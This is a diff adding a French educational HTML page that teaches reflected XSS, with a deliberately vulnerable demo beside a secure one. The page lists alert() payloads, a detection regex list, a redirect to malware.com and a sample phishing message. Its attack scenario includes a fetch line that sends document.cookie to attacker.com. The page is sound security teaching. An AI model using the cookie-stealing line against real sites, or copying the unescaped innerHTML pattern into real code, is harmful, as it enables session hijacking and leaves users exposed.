@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Réfléchi - TP Cybersécurité</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+
+<body>
+    <div class="container">
+        <!-- En-tête -->
+        <header class="header">
+            <h1>🔄 XSS Réfléchi (Reflected XSS)</h1>
+            <p class="subtitle">Script malveillant renvoyé dans la réponse</p>
+        </header>
+
+        <!-- Navigation -->
+        <nav class="nav">
+            <a href="index.html">🏠 Accueil</a>
+            <a href="sql-injection.html">💉 SQL Injection</a>
+            <a href="xss-reflected.html" class="active">🔄 XSS Réfléchi</a>
+            <a href="xss-stored.html">💾 XSS Stocké</a>
+            <a href="xss-dom.html">🌐 XSS DOM</a>
+            <a href="ddos.html">📊 DDoS</a>
+            <a href="inference.html">🔍 Inférence</a>
+        </nav>
+
+        <!-- Contenu principal -->
+        <section class="content-section">
+            <h2>Qu'est-ce que le XSS Réfléchi ?</h2>
+            <div class="explanation">
+                <p><strong>Le XSS Réfléchi (Reflected XSS)</strong> est une vulnérabilité où un script malveillant est
+                    envoyé au serveur (via URL ou formulaire) et immédiatement renvoyé dans la réponse HTTP sans être
+                    stocké. Le script s'exécute dans le navigateur de la victime.</p>
+                <h3>🎯 Caractéristiques :</h3>
+                <ul>
+                    <li><strong>Non persistant</strong> : Le script n'est pas stocké en base de données</li>
+                    <li><strong>Nécessite une interaction</strong> : La victime doit cliquer sur un lien malveillant
+                    </li>
+                    <li><strong>Via URL ou formulaire</strong> : Paramètres GET/POST reflétés dans la page</li>
+                    <li><strong>Vecteur d'attaque</strong> : Phishing, ingénierie sociale</li>
+                </ul>
+                <h3>💡 Exemple d'attaque :</h3>
+                <div class="code-block">
+                    # URL malveillante
+                    https://site.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;
+
+                    # L'attaquant envoie ce lien à la victime
+                    # Le serveur renvoie : "Résultats pour: &lt;script&gt;alert('XSS')&lt;/script&gt;"
+                    # Le script s'exécute dans le navigateur de la victime !
+                </div>
+            </div>
+
+            <!-- Démonstration côte à côte -->
+            <div class="demo-container">
+                <!-- VERSION VULNÉRABLE -->
+                <div class="vulnerable-section">
+                    <h3 class="section-title">🔓 Version Vulnérable</h3>
+                    <p><strong>Essayez ces payloads :</strong></p>
+                    <div class="code-block" style="font-size: 0.8rem;">
+                        &lt;script&gt;alert('XSS!')&lt;/script&gt;
+                        &lt;img src=x onerror="alert('Hack!')"&gt;
+                        &lt;svg onload="alert('XSS')"&gt;
+                    </div>
+
+                    <form id="vulnerableSearchForm">
+                        <div class="form-group">
+                            <label for="vuln-search">Rechercher :</label>
+                            <input type="text" id="vuln-search" placeholder="Tapez votre recherche...">
+                        </div>
+                        <button type="submit" class="btn">Rechercher</button>
+                    </form>
+
+                    <div id="vulnerableResults"></div>
+
+                    <div class="explanation" style="margin-top: 20px; background: white;">
+                        <h4>⚠️ Code vulnérable :</h4>
+                        <div class="code-block">
+                            // ❌ VULNÉRABLE - Réflexion directe
+                            &lt;?php
+                            $search = $_GET['q'];
+                            echo "Résultats pour: " . $search;
+                            ?&gt;
+
+                            // JavaScript
+                            resultsDiv.innerHTML =
+                            "Résultats pour: " + searchQuery;
+                            // Pas d'échappement → XSS !
+                        </div>
+                        <p><strong>Problème :</strong> L'entrée utilisateur est directement insérée dans le HTML sans
+                            validation ni échappement.</p>
+                    </div>
+                </div>
+
+                <!-- VERSION SÉCURISÉE -->
+                <div class="secure-section">
+                    <h3 class="section-title">✅ Version Sécurisée</h3>
+                    <p><strong>Essayez les mêmes payloads :</strong></p>
+
+                    <form id="secureSearchForm">
+                        <div class="form-group">
+                            <label for="secure-search">Rechercher :</label>
+                            <input type="text" id="secure-search" placeholder="Tapez votre recherche...">
+                        </div>
+                        <button type="submit" class="btn">Rechercher</button>
+                    </form>
+
+                    <div id="secureResults"></div>
+
+                    <div class="explanation" style="margin-top: 20px; background: white;">
+                        <h4>✅ Code sécurisé :</h4>
+                        <div class="code-block">
+                            // ✅ SÉCURISÉ - Échappement HTML
+                            function escapeHTML(str) {
+                            return str
+                            .replace(/&/g, '&amp;')
+                            .replace(/</g, '&lt;' ) .replace( />/g, '&gt;')
+                            .replace(/"/g, '&quot;')
+                            .replace(/'/g, '&#039;');
+                            }
+
+                            // Ou utiliser textContent
+                            resultsDiv.textContent =
+                            "Résultats pour: " + searchQuery;
+                        </div>
+                        <p><strong>Protections :</strong></p>
+                        <ul>
+                            <li>✅ Échappement des caractères HTML spéciaux</li>
+                            <li>✅ Utilisation de textContent au lieu de innerHTML</li>
+                            <li>✅ Validation et filtrage côté serveur</li>
+                            <li>✅ Content Security Policy (CSP)</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Scénario d'attaque réel -->
+            <div class="explanation">
+                <h3>🎭 Scénario d'attaque réel :</h3>
+                <ol>
+                    <li><strong>L'attaquant</strong> trouve une page vulnérable :
+                        <code>https://bank.com/search?q=</code></li>
+                    <li><strong>Il crée</strong> une URL malveillante :
+                        <div class="code-block">
+                            https://bank.com/search?q=&lt;script&gt;
+                            fetch('https://attacker.com/steal?cookie=' + document.cookie)
+                            &lt;/script&gt;
+                        </div>
+                    </li>
+                    <li><strong>Il envoie</strong> cette URL par email/SMS (phishing) :
+                        <div class="message message-warning" style="margin-top: 10px;">
+                            📧 "Votre compte bancaire nécessite une vérification. Cliquez ici !"
+                        </div>
+                    </li>
+                    <li><strong>La victime clique</strong> sur le lien</li>
+                    <li><strong>Le serveur</strong> renvoie la page avec le script non échappé</li>
+                    <li><strong>Le script s'exécute</strong> dans le navigateur de la victime</li>
+                    <li><strong>Les cookies</strong> (session) sont envoyés à l'attaquant</li>
+                    <li><strong>L'attaquant</strong> peut maintenant se connecter en tant que la victime !</li>
+                </ol>
+            </div>
+
+            <!-- Impacts et vecteurs -->
+            <div class="explanation">
+                <h3>💥 Impacts du XSS Réfléchi :</h3>
+                <ul>
+                    <li><strong>Vol de session</strong> : Envoi des cookies à l'attaquant</li>
+                    <li><strong>Keylogging</strong> : Enregistrement des frappes clavier</li>
+                    <li><strong>Redirection malveillante</strong> : <code>window.location = 'https://malware.com'</code>
+                    </li>
+                    <li><strong>Phishing interne</strong> : Affichage de faux formulaires de connexion</li>
+                    <li><strong>Défacement</strong> : Modification du contenu de la page</li>
+                    <li><strong>Propagation de malware</strong> : Téléchargement automatique de fichiers</li>
+                </ul>
+
+                <h3>🎯 Vecteurs d'injection courants :</h3>
+                <ul>
+                    <li>Paramètres d'URL (GET) : <code>?search=&lt;script&gt;</code></li>
+                    <li>Formulaires (POST) : Champs de recherche, commentaires</li>
+                    <li>Headers HTTP : User-Agent, Referer (reflétés dans logs/erreurs)</li>
+                    <li>Messages d'erreur : "Erreur : fichier '&lt;script&gt;' introuvable"</li>
+                </ul>
+            </div>
+
+            <!-- Bonnes pratiques -->
+            <div class="explanation">
+                <h3>🛡️ Défenses contre le XSS Réfléchi :</h3>
+                <h4>Côté Serveur :</h4>
+                <ul>
+                    <li><strong>Échappement contextuel</strong> : Encoder selon le contexte (HTML, JS, URL, CSS)</li>
+                    <li><strong>Validation stricte</strong> : Whitelist des caractères autorisés</li>
+                    <li><strong>Frameworks modernes</strong> : Utiliser des templates auto-échappants (Jinja2, Twig)
+                    </li>
+                    <li><strong>Content Security Policy (CSP)</strong> :
+                        <code>Content-Security-Policy: default-src 'self'</code></li>
+                    <li><strong>HttpOnly cookies</strong> : Empêcher l'accès JavaScript aux cookies</li>
+                </ul>
+
+                <h4>Côté Client :</h4>
+                <ul>
+                    <li><strong>textContent vs innerHTML</strong> : Préférer textContent pour le texte brut</li>
+                    <li><strong>DOMPurify</strong> : Bibliothèque de sanitization HTML</li>
+                    <li><strong>Validation d'entrée</strong> : Vérifier côté client aussi (mais pas seulement !)</li>
+                </ul>
+            </div>
+        </section>
+
+        <!-- Footer -->
+        <footer class="footer">
+            <p>💡 TP Cybersécurité - XSS Réfléchi</p>
+        </footer>
+    </div>
+
+    <script>
+        // ==================== VERSION VULNÉRABLE ====================
+        document.getElementById('vulnerableSearchForm').addEventListener('submit', function (e) {
+            e.preventDefault();
+
+            const searchQuery = document.getElementById('vuln-search').value;
+            const resultsDiv = document.getElementById('vulnerableResults');
+
+            if (!searchQuery.trim()) {
+                resultsDiv.innerHTML = '<p style="color: #64748b;">Veuillez entrer une recherche.</p>';
+                return;
+            }
+
+            // ⚠️ VULNÉRABLE : innerHTML sans échappement
+            // C'est exactement ce qu'il NE FAUT PAS faire !
+            resultsDiv.innerHTML = `
+                <div class="message message-info" style="margin-top: 15px;">
+                    <strong>📊 Résultats de recherche pour :</strong><br>
+                    <div style="margin-top: 10px; padding: 10px; background: white; border-radius: 6px;">
+                        ${searchQuery}
+                    </div>
+                </div>
+                <p style="margin-top: 15px; color: #64748b;">Aucun résultat trouvé.</p>
+            `;
+
+            // Détection si XSS a été injecté
+            if (containsXSS(searchQuery)) {
+                setTimeout(() => {
+                    resultsDiv.innerHTML += `
+                        <div class="message message-error" style="margin-top: 10px;">
+                            🚨 <strong>ATTAQUE XSS DÉTECTÉE !</strong><br>
+                            Votre script a été exécuté. Dans un vrai scénario, cela permettrait de :
+                            <ul style="margin-left: 20px; margin-top: 10px;">
+                                <li>Voler les cookies de session : <code>document.cookie</code></li>
+                                <li>Rediriger l'utilisateur : <code>window.location</code></li>
+                                <li>Modifier la page : <code>document.body.innerHTML</code></li>
+                                <li>Enregistrer les frappes clavier (keylogger)</li>
+                            </ul>
+                        </div>
+                    `;
+                }, 100);
+            }
+        });
+
+        // ==================== VERSION SÉCURISÉE ====================
+        document.getElementById('secureSearchForm').addEventListener('submit', function (e) {
+            e.preventDefault();
+
+            const searchQuery = document.getElementById('secure-search').value;
+            const resultsDiv = document.getElementById('secureResults');
+
+            if (!searchQuery.trim()) {
+                resultsDiv.innerHTML = '<p style="color: #64748b;">Veuillez entrer une recherche.</p>';
+                return;
+            }
+
+            // ✅ SÉCURISÉ : Utilisation de textContent + création d'éléments
+            resultsDiv.innerHTML = ''; // Vider d'abord
+
+            const messageDiv = document.createElement('div');
+            messageDiv.className = 'message message-info';
+            messageDiv.style.marginTop = '15px';
+
+            const title = document.createElement('strong');
+            title.textContent = '📊 Résultats de recherche pour :';
+
+            const queryDisplay = document.createElement('div');
+            queryDisplay.style.cssText = 'margin-top: 10px; padding: 10px; background: white; border-radius: 6px;';
+            // ✅ textContent échappe automatiquement le HTML
+            queryDisplay.textContent = searchQuery;
+
+            const noResults = document.createElement('p');
+            noResults.style.cssText = 'margin-top: 15px; color: #64748b;';
+            noResults.textContent = 'Aucun résultat trouvé.';
+
+            messageDiv.appendChild(title);
+            messageDiv.appendChild(document.createElement('br'));
+            messageDiv.appendChild(queryDisplay);
+
+            resultsDiv.appendChild(messageDiv);
+            resultsDiv.appendChild(noResults);
+
+            // Affichage d'un message si tentative XSS détectée
+            if (containsXSS(searchQuery)) {
+                const warningDiv = document.createElement('div');
+                warningDiv.className = 'message message-success';
+                warningDiv.style.marginTop = '10px';
+                warningDiv.innerHTML = `
+                    🛡️ <strong>TENTATIVE XSS NEUTRALISÉE !</strong><br>
+                    Le code malveillant a été échappé et ne s'est pas exécuté.<br>
+                    <strong>Votre recherche affichée de manière sûre :</strong>
+                    <div class="code-block" style="margin-top: 10px;">${escapeHTML(searchQuery)}</div>
+                `;
+                resultsDiv.appendChild(warningDiv);
+            }
+        });
+
+        // ==================== FONCTIONS UTILITAIRES ====================
+        function containsXSS(text) {
+            const xssPatterns = [
+                /<script/i,
+                /javascript:/i,
+                /onerror=/i,
+                /onload=/i,
+                /onclick=/i,
+                /<iframe/i,
+                /<img/i,
+                /<svg/i,
+                /<object/i,
+                /<embed/i
+            ];
+
+            return xssPatterns.some(pattern => pattern.test(text));
+        }
+
+        function escapeHTML(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+    </script>
+</body>
+
+</html>
